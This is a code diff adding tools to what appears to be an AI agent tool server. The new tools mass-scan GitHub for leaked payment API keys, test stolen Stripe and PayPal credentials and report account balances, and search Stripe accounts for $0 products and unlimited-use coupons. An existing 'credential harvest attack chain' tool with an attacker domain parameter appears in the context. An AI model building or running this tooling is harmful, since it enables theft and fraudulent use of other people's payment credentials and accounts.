@@ -469,5 +469,95 @@ def bionic_visa_attack_chain(target_email: str, attacker_domain: str = "attacker
     return credential_harvest_attack_chain(target_email, attacker_domain)
 
 
+# ── 11. Mass Payment Key Scanner ────────────────────────────────────────────
+
+from mass_payment_key_scanner import (
+    scan_github_for_payment_keys,
+    scan_repo_for_keys,
+    test_stripe_key,
+    test_paypal_token,
+    get_key_patterns,
+    get_search_queries,
+)
+
+@app.tool()
+def bionic_payment_key_scan(max_results: int = 10, queries: list = None) -> str:
+    """Mass scan GitHub for leaked payment API keys (Stripe, Visa, MC, PayPal, Amex)."""
+    return scan_github_for_payment_keys(max_results, queries)
+
+@app.tool()
+def bionic_payment_repo_scan(repo: str) -> str:
+    """Deep scan a specific repo for payment API keys."""
+    return scan_repo_for_keys(repo)
+
+@app.tool()
+def bionic_stripe_key_test(api_key: str) -> str:
+    """Test a Stripe API key and return balance info if valid."""
+    return test_stripe_key(api_key)
+
+@app.tool()
+def bionic_paypal_token_test(client_id: str, secret: str) -> str:
+    """Test PayPal API credentials and return token info if valid."""
+    return test_paypal_token(client_id, secret)
+
+@app.tool()
+def bionic_payment_patterns() -> str:
+    """Return all payment key patterns used for scanning."""
+    return get_key_patterns()
+
+@app.tool()
+def bionic_payment_queries() -> str:
+    """Return all GitHub search queries for payment keys."""
+    return get_search_queries()
+
+
+# ── 12. Stripe API Toolkit ──────────────────────────────────────────────────
+
+from stripe_toolkit import (
+    stripe_api_surface,
+    stripe_known_flaws,
+    stripe_test_card_numbers,
+    stripe_test_endpoint,
+    stripe_find_0amount_products,
+    stripe_find_unlimited_coupons,
+    stripe_check_balance,
+)
+
+@app.tool()
+def bionic_stripe_surface() -> str:
+    """Return the complete Stripe API attack surface mapping."""
+    return stripe_api_surface()
+
+@app.tool()
+def bionic_stripe_flaws() -> str:
+    """Return known historical Stripe logic flaws (patched, for reference)."""
+    return stripe_known_flaws()
+
+@app.tool()
+def bionic_stripe_cards() -> str:
+    """Return Stripe test card numbers for sandbox testing."""
+    return stripe_test_card_numbers()
+
+@app.tool()
+def bionic_stripe_test(endpoint: str, method: str = "GET", api_key: str = "", data: dict = None) -> str:
+    """Test a Stripe API endpoint in test mode."""
+    return stripe_test_endpoint(endpoint, method, api_key, data)
+
+@app.tool()
+def bionic_stripe_0amount(api_key: str, limit: int = 10) -> str:
+    """Scan a Stripe account for $0 or very low-priced products."""
+    return stripe_find_0amount_products(api_key, limit)
+
+@app.tool()
+def bionic_stripe_unlimited_coupons(api_key: str, limit: int = 10) -> str:
+    """Scan a Stripe account for coupons that can be redeemed unlimited times."""
+    return stripe_find_unlimited_coupons(api_key, limit)
+
+@app.tool()
+def bionic_stripe_balance(api_key: str) -> str:
+    """Check the current balance of a Stripe account."""
+    return stripe_check_balance(api_key)
+
+
 if __name__ == "__main__":
     app.run()
